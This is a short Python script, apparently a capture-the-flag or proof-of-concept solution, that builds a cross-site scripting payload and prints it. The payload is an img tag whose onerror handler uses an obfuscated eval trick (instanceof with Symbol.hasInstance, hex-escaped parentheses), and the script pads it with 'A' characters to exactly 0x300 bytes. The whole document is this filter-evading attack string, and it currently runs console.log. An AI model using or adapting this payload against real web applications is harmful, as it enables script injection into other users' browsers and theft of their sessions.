payload = "<img src=x onerror='\\'console.log\\x281\\x29\\'instanceof{[Symbol.hasInstance]:eval}' />"


assert len(payload) < 0x300

padding = "A"*(0x300-len(payload))

print(payload+padding)